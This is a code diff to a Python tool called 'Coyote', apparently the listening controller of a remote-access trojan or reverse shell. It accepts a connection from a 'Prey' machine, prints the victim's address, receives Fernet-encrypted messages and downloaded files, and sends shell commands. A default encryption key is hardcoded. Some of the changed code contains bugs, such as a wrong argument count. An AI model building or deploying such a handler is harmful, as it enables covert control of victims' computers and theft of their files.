@@ -13,27 +13,36 @@ class Coyote:
 		self.sock.listen(1)
 		self.sock.settimeout(0.0)
 		self.downloadfile = ""
-		self.features = {"totallyhear" : True,"hear":True}
-	def hearPrey(self):
-		connection = False
-		while self.features["totallyhear"]:
+		self.features = {"totallyhear" : True,"hear":True, "waitPrey": True, "printaddr":True}
+	def connectPrey(self):
+		while self.features["waitPrey"]:
 			try:
 				self.conn, addr = self.sock.accept()
-				self.conn.settimeout(0.0)
+				if self.features["printaddr"]:
+					print(addr)
 			except:
 				pass
 			else:
-				connection = True
-			while self.features["hear"] and connection:
+				break
+
+	def hearPrey(self):
+		while self.features["totallyhear"]:
+			while self.features["hear"]:
 				try:
-					msj = self.conn.recv(1024)
+					msj = self.conn.recv(3072)
 					msj = self.decode(msj)
-					if msj != "Sending file.":
-						print(msj)
+					if msj == "Sending file.":
+						self.downloadf(self)
 					else:
-						self.downloadfile()
-				except: 
+						print(msj)
+				except:
 					pass
+	def downloadf(self):
+		content = self.conn.recv(3072)
+		content = self.f.decrypt(content)
+		with open(self.downloadfile, "wb") as f:
+			f.write(content)
+
 	def shell(self):
 		if pv()[0] == "3":
 			raw_input = input
@@ -54,6 +63,11 @@ class Coyote:
 			msj = msj.encode()
 		msj = self.f.encrypt(msj)
 		self.conn.send(msj)
+	def decode(self, msj):
+		msj = self.f.decrypt(msj)
+		msj = msj.decode()
+		return msj
+
 
 def main():
 	o = op("Usage: %prog [args] [values]")
@@ -62,6 +76,7 @@ def main():
 	o.add_option("-k", "--key", dest="key",default="FUYG1sNMAm-QVFJ02RMh6Bpms7bxZSMLmqjmnJXsO3w=",help="Set Fernet key")
 	(opt, argv) = o.parse_args()
 	c = Coyote(opt.ip,opt.port,opt.key)
+	c.connectPrey()
 	hear = Thread(target=c.hearPrey)
 	hear.daemon = True
 	hear.start()
